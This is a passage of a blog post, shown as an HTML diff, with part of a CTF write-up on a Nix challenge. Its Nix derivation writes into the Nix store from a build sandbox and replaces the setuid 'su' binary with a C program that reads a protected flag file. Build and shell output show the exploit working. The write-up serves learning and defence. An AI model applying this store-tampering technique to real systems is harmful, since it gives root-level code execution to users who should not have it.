+</span></mark></code></pre>
+<h3 id="abusing-read-write-access-to-the-nix-store">Abusing Read-Write Access to the Nix Store</h3>
+<p>This second strategy was pretty much what I wanted to do during the CTF,
+but didn’t manage to.
+However, with more time, a fresh mind, and the assurance that it actually
+works, I tried to simply write to a file in the Nix store from inside
+the derivation and it actually works!
+One small caveat is that you must be able to reference the file from
+your derivation, so that it is included in the sandbox, but that is no problem
+for the various packages in nixpkgs.</p>
+<p>My first instinct with this new ability was to override the <code>nix.conf</code> configuration
+and add <code>/data</code> to the sandbox, just like mentioned previously.
+However, this does not work since <em>someone</em> would have to restart <code>nix-daemon</code>,
+and the only user with the permissions to do so would be <code>root</code>.</p>
+<p>Another prime target for modifications is any kind of setuid binaries, such as
+<code>sudo</code>.
+While <code>sudo</code> has been disabled in this system, many other setuid binaries are still
+available, as we can see by taking a look at the <a rel="noopener nofollow noreferrer" target="_blank" href="https://discourse.nixos.org/t/how-to-create-setuid-wrapper-for-installed-program/2590/2"><code>/run/wrappers/bin</code> directory</a>.</p>
+<pre style="background-color:#2b2c2f;color:#cccece;"><code><span>[root@nixos:~]# ls -la /run/wrappers/bin/
+</span><span>total 832
+</span><span>drwxr-xr-x 2 root root         300 Mar 18 19:31 .
+</span><span>drwxr-xr-x 3 root root          80 Mar 18 19:31 ..
+</span><span>-r-s--x--x 1 root root       63472 Mar 18 19:31 chsh
+</span><span>-r-sr-x--- 1 root messagebus 63472 Mar 18 19:31 dbus-daemon-launch-helper
+</span><span>-r-s--x--x 1 root root       63472 Mar 18 19:31 fusermount
+</span><span>-r-s--x--x 1 root root       63472 Mar 18 19:31 fusermount3
+</span><span>-r-s--x--x 1 root root       63472 Mar 18 19:31 mount
+</span><span>-r-s--x--x 1 root root       63472 Mar 18 19:31 newgidmap
+</span><span>-r-s--x--x 1 root root       63472 Mar 18 19:31 newgrp
+</span><span>-r-s--x--x 1 root root       63472 Mar 18 19:31 newuidmap
+</span><span>-r-s--x--x 1 root root       63472 Mar 18 19:31 passwd
+</span><span>-r-s--x--x 1 root root       63472 Mar 18 19:31 sg
+</span><span>-r-s--x--x 1 root root       63472 Mar 18 19:31 su
+</span><span>-r-s--x--x 1 root root       63472 Mar 18 19:31 umount
+</span><span>-r-s--x--x 1 root root       63472 Mar 18 19:31 unix_chkpwd
+</span></code></pre>
+<p>Realistically, any of these could be chosen, since they all run as root,
+but for the purpose of this example I am going with <code>su</code>, which is provided
+by the <code>shadow</code> package (as shown by a quick <code>readlink $(whereis su)</code>).</p>
+<pre style="background-color:#2b2c2f;color:#cccece;"><code><span>[user@nixos:~]$ readlink $(whereis su)
+</span><span>/nix/store/bys9y4myz2a042l6yscf7gxibi4aw8c7-shadow-4.14.3-su/bin/su
+</span></code></pre>
+<p>With this in mind, we can now change our derivation to override the <code>su</code>
+binary with a custom binary that just prints the flag.
+To achieve this, we can copy our malicious binary over the <code>su</code> binary
+in <code>pkgs.shadow.su</code> (<a rel="noopener nofollow noreferrer" target="_blank" href="https://github.com/NixOS/nixpkgs/blob/6e2f00c83911461438301db0dba5281197fe4b3a/pkgs/os-specific/linux/shadow/default.nix#L88-L90"><code>su</code> is the output of the <code>shadow</code> package</a> that
+actually includes the <code>su</code> binary).
+Initially, I used a simple bash script that would just <code>cat</code> the flag, but
+<a rel="noopener nofollow noreferrer" target="_blank" href="https://unix.stackexchange.com/questions/364/allow-setuid-on-shell-scripts">Linux ignores the setuid bit on all interpreted executables</a>,
+which meant the script did not run as root and failed to print it.
+For that reason, we can resort to a simple C binary that does the same thing.</p>
+<pre data-lang="nix" style="background-color:#2b2c2f;color:#cccece;" class="language-nix "><code class="language-nix" data-lang="nix"><span style="color:#5f6364;"># ...
+</span><span style="color:#5fb3b3;">{
+</span><span>  </span><span style="color:#bb80b3;">packages</span><span>.</span><span style="color:#5fb3b3;">${</span><span style="color:#f99157;">system</span><span style="color:#5fb3b3;">} = </span><span style="color:#c594c5;">rec </span><span style="color:#5fb3b3;">{
+</span><span>    </span><span style="color:#bb80b3;">exploit </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">pkgs</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">stdenv</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">mkDerivation </span><span style="color:#5fb3b3;">{
+</span><span>      </span><span style="color:#5f6364;"># ...
+</span><span>      </span><span style="color:#bb80b3;">installPhase </span><span style="color:#5fb3b3;">= &#39;&#39;
+</span><span style="color:#99c794;">        echo </span><span style="color:#5fb3b3;">${</span><span style="color:#f99157;">pkgs</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">shadow</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">su</span><span style="color:#5fb3b3;">}
+</span><span style="color:#99c794;">
+</span><span style="color:#99c794;">        chmod +w </span><span style="color:#5fb3b3;">${</span><span style="color:#f99157;">pkgs</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">shadow</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">su</span><span style="color:#5fb3b3;">}</span><span style="color:#99c794;">/bin/su
+</span><mark style="background-color:#3e4044;"><span style="color:#99c794;">        cp </span><span style="color:#5fb3b3;">${</span><span style="color:#f99157;">get-flag</span><span style="color:#5fb3b3;">}</span><span style="color:#99c794;">/bin/get-flag </span><span style="color:#5fb3b3;">${</span><span style="color:#f99157;">pkgs</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">shadow</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">su</span><span style="color:#5fb3b3;">}</span><span style="color:#99c794;">/bin/su
+</span></mark><span style="color:#99c794;">        chmod -w </span><span style="color:#5fb3b3;">${</span><span style="color:#f99157;">pkgs</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">shadow</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">su</span><span style="color:#5fb3b3;">}</span><span style="color:#99c794;">/bin/su
+</span><span style="color:#99c794;">
+</span><span style="color:#99c794;">        echo success &gt; $out
+</span><span style="color:#99c794;">      </span><span style="color:#5fb3b3;">&#39;&#39;;
+</span><span>    </span><span style="color:#5fb3b3;">};
+</span><span>
+</span><span>    </span><span style="color:#5f6364;"># Prints flag to stdout
+</span><span>    </span><span style="color:#bb80b3;">get-flag </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">pkgs</span><span style="color:#5fb3b3;">.</span><span style="color:#f99157;">writeCBin </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">get-flag</span><span style="color:#5fb3b3;">&quot; &#39;&#39;
+</span><span style="color:#99c794;">      #include &lt;stdio.h&gt;
+</span><span style="color:#99c794;">      int main() {
+</span><span style="color:#99c794;">        char buffer[1024];
+</span><span style="color:#99c794;">        FILE *f = fopen(&quot;/data/flag&quot;, &quot;r&quot;);
+</span><span style="color:#99c794;">        int n = fread(buffer, 1, 1023, f);
+</span><span style="color:#99c794;">        fwrite(buffer, 1, n, stdout);
+</span><span style="color:#99c794;">        return 0;
+</span><span style="color:#99c794;">      }
+</span><span style="color:#99c794;">    </span><span style="color:#5fb3b3;">&#39;&#39;;
+</span><span>  </span><span style="color:#5fb3b3;">};
+</span><span style="color:#5fb3b3;">}
+</span></code></pre>
+<pre style="background-color:#2b2c2f;color:#cccece;"><code><span>[user@nixos:~]$ nix build .#exploit --print-build-logs
+</span><span>warning: Option &#39;accept-flake-config&#39; is too dangerous, skipping.
+</span><span>warning: Option &#39;allow-new-privileges&#39; is too dangerous, skipping.
+</span><span>warning: Option &#39;build-hook&#39; is too dangerous, skipping.
+</span><span>warning: Option &#39;post-build-hook&#39; is too dangerous, skipping.
+</span><span>warning: Option &#39;pre-build-hook&#39; is too dangerous, skipping.
+</span><span>exploit&gt; Running phase: installPhase
+</span><span>exploit&gt; /nix/store/bys9y4myz2a042l6yscf7gxibi4aw8c7-shadow-4.14.3-su
+</span><span>
+</span><span>[user@nixos:~]$ su
+</span><mark style="background-color:#3e4044;"><span>kalmar{faker_flag}
+</span></mark></code></pre>
+<p>And we got the flag again! 🥳</p>
+<h2 id="final-remarks">Final Remarks</h2>
+<p>I enjoyed this challenge a lot and I’m looking forward for more Nix-related challenges
+in future CTFs.
+Diving inside Nix’s inner workings has made me grasp a better understanding of how
+it all works, and it has even made me <a rel="noopener nofollow noreferrer" target="_blank" href="https://github.com/diogotcorreia/dotfiles/commit/e8cd4c0676eb8cc6ce7c7e814846831568adb735">remove myself from the <code>trusted-users</code></a>
+in my own systems.</p>
+<p>Furthermore, I was suspicious of the use of such an old version of Nix (2.13), but I replicated
+the three exploits in Nix 2.18.1 (the “default” for the pinned commit in the challenge)
+and they worked flawlessly.</p>
+<p>As final acknowledgements, I have to thank <a rel="noopener nofollow noreferrer" target="_blank" href="https://hachyderm.io/@leftpaddotpy">jade</a> for the initial
+<a rel="noopener nofollow noreferrer" target="_blank" href="https://hachyderm.io/@leftpaddotpy/112103523507978883">Mastodon post</a>, <a rel="noopener nofollow noreferrer" target="_blank" href="https://hachyderm.io/@nrab">niko</a> for making this awesome challenge,
+and my teammates for the rubber duck debugging during the CTF.</p>
+
+    </div>
+  </article>
+  <div><a href="https://parnianlali.github.io/blog/atom.xml" style="display: inline-block; width: 2rem;" target="_blank">
+          <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24"><path d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20 5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1Z"/></svg>
+        </a></div>
+  <div class="disclaimer">
+    This post has been written by humans only, unless otherwise explicitly stated.<br>
+    Opinions are solely my own and do not reflect those of any employer, past, present, or future.<br>
+    Content licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener noreferrer">CC BY-NC-SA 4.0</a>.
+  </div>
+</div>
+
+
+    </main>
+    <footer>
+      <div class="container footer-sections">
+        <div class="footer-section">
+          <h2>Contact me</h2>
+          <ul>
+            
+              <li>
+                <span class="social-label">Email: </span>
+                <a
+                  href="mailto:parnian.lalii@gmail.com"
+                  target="_blank"
+                  rel="me noopener"
+                  data-umami-event="mail-social-footer"
+                >
+                  parnian.lalii@gmail.com
+                </a>
+              </li>
+            
+              <li>
+                <span class="social-label">Linkedin: </span>
+                <a
+                  href="www.linkedin.com&#x2F;in&#x2F;parnianlali"
+                  target="_blank"
+                  rel="me noopener"
+                  data-umami-event="Linkedin-social-footer"
+                >
+                  parnian lali
+                </a>
+              </li>
+            
+              <li>
+                <span class="social-label">github: </span>
+                <a
+                  href="https:&#x2F;&#x2F;github.com&#x2F;parnianlali"
+                  target="_blank"
+                  rel="me noopener"
+                  data-umami-event="github-social-footer"
+                >
+                  parnianlali
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+        <div class="footer-section">
+          <h2>Site map</h2>
+          <ul>
+            <li><a href="https:&#x2F;&#x2F;parnianlali.github.io">Home</a></li>
+            <li><a href="https:&#x2F;&#x2F;github.com&#x2F;parnianlali&#x2F;CV">CV</a></li>
+          </ul>
+        </div>
+      </div>
+      <div class="copyright">
+        <div class="container">
+          <p class="copyright-text">&copy; 2025 Parnian Lali. Based on a template by <a href="https://github.com/diogotcorreia">Diogo Correia</a>.
+          </p>
+          
+        </div>
+      </div>
+    </footer>
+
+<script>
+  document.addEventListener("DOMContentLoaded", () => {
+    // 
+    const navbar = document.querySelector("nav");
+    const observer = new IntersectionObserver(entries => {
+      if (entries[0].boundingClientRect.y < 0) {
+        navbar.classList.add("navbar--sticky");
+      } else {
+        navbar.classList.remove("navbar--sticky");
+      }
+    });
+    observer.observe(document.querySelector("#navbar-trigger"));
+
+    const drawer = document.getElementById("navbar-drawer");
+    const drawerOpenBtn = document.getElementById("drawer-open");
+    const drawerCloseBtn = document.getElementById("drawer-close");
+
+    drawerOpenBtn.addEventListener("click", () => {
+      drawer.showModal();
+    });
+    document.querySelectorAll("#drawer-close, #navbar-drawer a").forEach(element => {
+      element.addEventListener("click", () => {
+        drawer.close();
+      });
+    });
+  });
+</script>
+    <script
+      async
+      defer
+      data-website-id="25c8aedf-a960-4b55-8c70-7bc4b2ad587b"
+      src="https://umami.diogotc.com/hellothere.js"
+      data-domains="diogotc.com,www.diogotc.com"
+    ></script>
+
+  </body>
+</html>
